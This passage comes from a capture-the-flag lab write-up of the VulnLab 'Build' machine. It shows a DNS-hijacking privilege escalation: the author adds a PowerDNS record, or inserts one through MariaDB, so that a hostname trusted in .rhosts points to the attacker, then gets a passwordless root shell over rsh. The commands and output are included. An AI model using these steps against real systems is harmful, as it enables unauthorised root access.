root@5ac6c7d6fb8e:~# findmnt
TARGET                  SOURCE                                                FSTYPE  OPTIONS
...
├─/root                 /dev/mapper/ubuntu--vg-ubuntu--lv[/root/scripts/root] ext4    rw,relatime
```

The `/root/scripts/root` directory on the host is mounted to `/root` on the Jenkins container, so at this point I assumed that the same `.rhosts` file may be present on the host too under `/root`, which turned out to be true. It's possible that it was mistakenly mounted to the Jenkins container or that the admin wanted to configure remote access to the Jenkins container too at some point.

The `.rhosts` entries indicate that remote clients from `admin.build.vl` and `intern.build.vl` are allowed to login as any user on the server (including `root`). The authentication procedure likely resolves the trusted domains to IP addresses using the PowerDNS server and check if the connection request comes from them.

Since the `admin.build.vl` record doesn't exist in the PowerDNS database and `intern.build.vl` resolves to `172.18.0.1`, it means that passwordless logins are only allowed from `172.18.0.1`, which is the host itself.

However, since we can edit the DNS records, we can try to either add a DNS record for `admin.build.vl` or modify the record for `intern.build.vl` and point it to the IP address of our attack machine, and maybe we would be able to login using `rlogin` or `rsh` this time because the server would consider our IP address trusted!

## DNS hijacking

Let's add a record for `admin.build.vl` pointing to our attack machine's IP address from the PowerDNS admin portal.

<http://172.18.0.6/domain/build.vl>

![alt text](../assets/vulnlab/machines/build/img/image-14.png)

Click on *Save*, then *Save Changes* and *Apply Changes*.

We can confirm that the record was correctly added using `dig`:

```shell
└─$ dig admin.build.vl @$T                      

; <<>> DiG 9.19.21-1-Debian <<>> admin.build.vl @10.10.83.17
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59679
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;admin.build.vl.            IN  A

;; ANSWER SECTION:
admin.build.vl.     60  IN  A   10.8.1.246

;; Query time: 20 msec
;; SERVER: 10.10.83.17#53(10.10.83.17) (UDP)
;; WHEN: Sat May 11 22:51:50 CEST 2024
;; MSG SIZE  rcvd: 59
```

Now we can use either `rlogin` or `rsh` to login as root on the target without a password!

```shell
└─$ rsh root@build.vl               
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat May 11 08:53:05 PM UTC 2024

  System load:  0.189453125       Users logged in:                  0
  Usage of /:   62.6% of 9.75GB   IPv4 address for br-f8002c9d7234: 172.18.0.1
  Memory usage: 58%               IPv4 address for docker0:         172.17.0.1
  Swap usage:   0%                IPv4 address for ens5:            10.10.83.17
  Processes:    141


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@build:~# 
```

We can get the root flag.

```shell
root@build:~# ls
root.txt  scripts  snap
root@build:~# cat root.txt
VL{<REDACTED>}
```

Note that it's also possible the add the record from the MariaDB shell directly, bypassing the need to crack the `admin`'s hash and adding it from the web interface:

```shell
MariaDB [powerdnsadmin]> INSERT INTO `records` (`domain_id`,`name`,`type`,`content`,`ttl`,`prio`,`disabled`,`ordername`,`auth`) VALUES (1,'admin.build.vl','A','10.8.1.246',60,0,0,NULL,1);
Query OK, 1 row affected (0.027 sec)
```
